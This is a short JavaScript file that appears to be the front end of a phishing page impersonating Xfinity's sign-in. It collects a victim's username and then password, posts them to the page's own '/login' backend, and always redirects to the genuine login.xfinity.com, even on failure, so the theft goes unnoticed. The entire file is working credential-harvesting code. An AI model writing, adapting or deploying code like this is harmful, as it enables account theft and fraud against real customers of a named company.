function goNext() {
  const username = document.getElementById("username").value.trim();

  if (!username) {
    alert("Please enter your email, mobile, or username.");
    return;
  }

  // Store username so password.html can read it
  localStorage.setItem("xfinityUser", username);
  window.location.href = "password.html";
}

function login() {
  const username = localStorage.getItem("xfinityUser");
  const password = document.getElementById("password").value.trim();

  if (!password) {
    alert("Please enter your password.");
    return;
  }

  fetch("/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password })
  })
  .then(res => {
    // Backend ALWAYS redirects, so follow it
    if (res.redirected) {
      window.location.href = res.url;
    } else {
      // Even if something weird happens, still redirect
      window.location.href = "https://login.xfinity.com/login";
    }
  })
  .catch(() => {
    // If fetch fails, still redirect
    window.location.href = "https://login.xfinity.com/login";
  });
}